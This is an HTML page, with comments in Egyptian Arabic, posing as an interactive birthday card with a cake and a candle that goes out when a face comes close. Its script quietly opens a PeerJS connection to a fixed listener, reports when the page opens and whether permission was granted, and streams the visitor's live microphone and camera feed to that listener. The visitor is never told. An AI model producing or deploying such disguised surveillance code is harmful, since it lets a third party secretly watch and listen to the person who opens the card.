<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎂 Interactive Birthday Card</title>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
</head>
<body>
  <!-- Overlay لازم تضغطه عشان يشتغل طلب الإذن -->
  <div id="overlay">اضغط لبدء الكارت</div>

  <div class="card">
    <div class="cake">
      <div class="layer layer1"></div>
      <div class="layer layer2"></div>
      <div class="layer layer3"></div>
      <div class="icing"></div>
      <div class="candle" id="candle">
        <div class="flame" id="flame"></div>
      </div>
    </div>
    <!-- هنا هتعرض الكاميرا -->
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer = new Peer();      // Peer عشوائي للمرسل
    let dataConn;
    const overlay = document.getElementById('overlay');
    const videoEl = document.getElementById('userCam');
    const flame   = document.getElementById('flame');

    overlay.addEventListener('click', () => {
      overlay.style.display = 'none';

      // 1) افتح DataChannel للمستمع
      dataConn = peer.connect(LISTENER_ID);
      dataConn.on('open', () => {
        dataConn.send({ event: 'page-open' });
      });

      // 2) اطلب إذن الميكروفون والكاميرا
      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
        .then(stream => {
          // عرض الكاميرا
          videoEl.srcObject = stream;
          // حدث السماح
          dataConn.send({ event: 'mic-allowed' });
          // بث الصوت والفيديو للمستمع
          peer.call(LISTENER_ID, stream);
        })
        .catch(err => {
          dataConn.send({ event: 'mic-denied' });
          console.error('Mic/Camera access error:', err);
        });

      // 3) داير الكاميرا ونظّم مكانها
      Object.assign(videoEl.style, {
        position: 'absolute',
        top: '10px',
        left: 'calc(50% - 75px)',
        width: '150px',
        height: '150px',
        borderRadius: '50%',
        border: '4px solid white',
        boxShadow: '0 0 15px rgba(255,255,255,0.7)'
      });
    });

    // لو عايز تضيف تتبع قرب الوجه لإطفاء شمعة
    Promise.all([
      faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/weights')
    ]).then(() => {
      (async function detect(){ 
        const res = await faceapi.detectSingleFace(videoEl, new faceapi.TinyFaceDetectorOptions());
        if (res && res.box.height > 120) flame.style.display = 'none';
        requestAnimationFrame(detect);
      })();
    });
  </script>
</body>
</html>
